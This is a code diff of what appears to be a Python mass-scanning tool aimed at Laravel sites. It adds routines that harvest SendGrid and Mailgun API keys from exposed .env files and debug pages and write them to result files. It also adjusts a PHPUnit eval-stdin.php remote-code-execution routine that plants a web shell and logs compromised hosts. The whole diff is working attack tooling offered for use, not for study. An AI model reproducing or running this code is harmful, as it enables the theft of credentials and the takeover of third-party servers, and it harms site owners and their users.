+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
                 except:
-                    return False
-            else:
+                     pass
+            if objek == 0:
                 return False
+            else:
+                return objek
+         except:
+                        pass
+        elif method == 'debug':
+         try:   
+            if 'SENDGRID_SECRET' in teks:
+                try:
+                    key = re.findall('<td>SENDGRID_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if ' ' in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        ceker_sendgrid(str(key))
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if "SENDGRID_API_SECRET" in teks:
+                try:
+                    key = re.findall('<td>SENDGRID_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        ceker_sendgrid(str(key))
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if "SENDGRID_API_KEY" in teks:
+                try:
+                    key = re.findall('<td>SENDGRID_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        ceker_sendgrid(str(key))
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                    pass
+            if "SENDGRID_KEY" in teks:
+                try:
+                    key = re.findall('<td>SENDGRID_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        ceker_sendgrid(str(key))
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                    pass
+            if objek == 0:
+                return False
+            else:
+                return objek
+         except:
+          pass
         else:
             return False
 
+    def get_mailgun(self, method, urlku, teks):
+        objek = 0
+        if method == 'env':
+         try:  
+            if 'MAILGUN_SECRET' in teks:
+               #try:
+                try:
+                    key = re.findall('MAILGUN_SECRET=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                     pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'MAILGUN_API_SECRET=' in teks:
+               #try:
+                try:
+                    key = re.findall('MAILGUN_API_SECRET=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'MAILGUN_API_KEY=' in teks:
+               #try:
+                try:
+                    key = re.findall('MAILGUN_API_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'MAILGUN_APIKEY=' in teks:
+               #try:
+                try:
+                    key = re.findall('MAILGUN_APIKEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'MAILGUN_KEY=' in teks:
+                try:
+                    key = re.findall('MAILGUN_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if objek == 0:
+                return False
+            else:
+                return objek
+         except:
+            pass
+        elif method == 'debug':
+         try:   
+            if 'MAILGUN_SECRET' in teks:
+                try:
+                    key = re.findall('<td>MAILGUN_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if ' ' in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if "MAILGUN_API_SECRET" in teks:
+                try:
+                    key = re.findall('<td>MAILGUN_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if "MAILGUN_API_KEY" in teks:
+                try:
+                    key = re.findall('<td>MAILGUN_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                    pass
+            if "MAILGUN_KEY" in teks:
+                try:
+                    key = re.findall('<td>MAILGUN_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                    pass
+            if objek == 0:
+                return False
+            else:
+                return objek
+         except:
+          pass
+        else:
+            return False
     def get_stripe(self, method, urlku, teks):
         if method == 'env':
             if 'STRIPE_KEY=' in teks:
@@ -1601,7 +2497,7 @@ class grabber:
                 return False
         else:
             return False
-
+    
     def get_ftp(self, method, urlku, teks):
         if method == 'env':
             if 'FTP_HOST=' in teks:
@@ -1788,14 +2684,15 @@ def gas(tar):
                 i = i.replace('[DOMAIN]', pee)
             # print(i)
         # print(tss+i)
-        req = requests.get(
+        ryq = requests.get(
             tss + i,
             headers=head,
             timeout=15,
             allow_redirects=False,
             verify=False
-        ).text
-        if 'DB_PASSWORD=' in req or 'APP_KEY=' in req or 'APP_URL=' in req or "APP_NAME=" in req:
+        )
+        req = ryq.text
+        if 'DB_PASSWORD=' in req or 'APP_KEY=' in req or 'APP_URL=' in req or "APP_NAME=" in req or "200" in ryq.status_code:
             vuln = tss + i
             break
     if vuln == False:
@@ -1864,7 +2761,7 @@ def phpunit(target):
     for rce in exp:
         r = requests.get(url_req, data=rce, headers=head, allow_redirects=False, timeout=15)
         tes_point = requests.get(url_req.replace('eval-stdin.php', 'upper.php'), headers=head, timeout=15)
-        if 'Vuln!!' in tes_point.text:
+        if 'Vuln!!' in tes_point.text or 'MARIJUANA' in tes_point.text:
             with open('Result/shell.txt', 'a') as epep:
                 epep.write(url_req.replace('eval-stdin.php', 'upper.php') + '\n')
             vulner = True
@@ -2339,6 +3236,10 @@ class laravel_grabber:
         self.loop = 0
         self.bad = 0
         self.smtp = 0
+        self.sendgrid = 0
+        self.braintre = 0
+        self.sendgridcek = 0
+        self.mailguncek = 0
         self.database = 0
         self.nexmo = 0
         self.aws = 0
@@ -2350,7 +3251,7 @@ class laravel_grabber:
     def attack(self, ts):
         self.loop += 1
         if os.name == 'nt' and sys.version_info.major == 3:
-            ctypes.windll.kernel32.SetConsoleTitleW("{}|ENV=>({})|DEBUG=>({})|SMTP=>({})|DB=>({})|AWS=>({})|NEXMO=>({})|TWILIO=>({})|SHELL=>({})".format(self.loop, self.env, self.debug, self.smtp, self.database, self.aws, self.nexmo, self.twilio,self.unit))
+            ctypes.windll.kernel32.SetConsoleTitleW("{}|ENV=>({})|DEBUG=>({})|SMTP=>({})|DB=>({})|AWS=>({})|NEXMO=>({})|TWILIO=>({})|SHELL=>({})|SENDGRID=>({})".format(self.loop, self.env, self.debug, self.smtp, self.database, self.aws, self.nexmo, self.twilio,self.unit,self.sendgrid))
         try:
             tos = gas(ts)
             # print(tos)
@@ -2366,6 +3267,18 @@ class laravel_grabber:
                 if smtp:
                     self.smtp += smtp
                     text += '[\033[92mSMTP\033[0m]'
+                braintree = grabber().get_braintre(tos['method'], tos['url'], tos['respon'])
+                if braintree:
+                    self.braintree += braintree
+                    text += '[\033[92mBRAINTREE\033[0m]'
+                sendgridcek = grabber().get_sendgrid(tos['method'], tos['url'], tos['respon'])
+                if sendgridcek:
+                    self.sendgridcek += sendgridcek
+                    text += '[\033[92mSENDGRID\033[0m]'
+                mailguncek = grabber().get_mailgun(tos['method'], tos['url'], tos['respon'])
+                if mailguncek:
+                    self.mailguncek += mailguncek
+                    text += '[\033[92mMAILGUN\033[0m]'
                 databes = grabber().get_database(tos['method'], tos['url'], tos['respon'])
                 if databes:
                     self.database += 1
@@ -2550,14 +3463,14 @@ class laravel_grabber:
     def cekHttp(self, ez):
         resume = False
         try:
-            if 'https://' in ez:
-                ez = re.findall('https://(.*?)/', ez)[0]
+            if '://' not in ez:
+                ez = re.findall('http://(.*?)/', ez)[0]
                 # print(ez)
-                self.attack('https://' + ez)
+                self.attack('http://' + ez)
                 resume = False
             elif 'https://' in ez:
                 ez = re.findall('https://(.*?)/', ez)[0]
-                self.attack('http://' + ez)
+                self.attack('https://' + ez)
                 resume = False
             else:
                 resume = True
@@ -2574,7 +3487,7 @@ class laravel_grabber:
                     ress = sock.connect_ex((ez, 80))
                     sock.close()
                     if str(ress) == '0':
-                        self.attack('http://' + ez)
+                        self.attack('https://' + ez)
                     else:
                         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         sock.settimeout(6)
@@ -2588,7 +3501,7 @@ class laravel_grabber:
                             ress = sock.connect_ex((ez, 8080))
                             sock.close()
                             if str(ress) == '0':
-                                self.attack('http://' + ez + ':8080')
+                                self.attack('https://' + ez + ':8080')
                             else:
                                 if ':' in ez:
                                     key = ez.split(':')
@@ -2599,7 +3512,7 @@ class laravel_grabber:
                                             ress = sock.connect_ex((ez, int(key[1])))
                                             sock.close()
                                             if str(ress) == '0':
-                                                self.attack('http://' + ez + ':' + key[1])
+                                                self.attack('https://' + ez + ':' + key[1])
                                         except:
                                             pass
                                     else:
@@ -2608,6 +3521,7 @@ class laravel_grabber:
                                     pass
                 except:
                     print(kuning + '#' + reset + ' {0} - '.format('http://'+str(ez)) + kuning + "Cant Access Site")
+                    #print(er)
 
     def home(self):
         try:
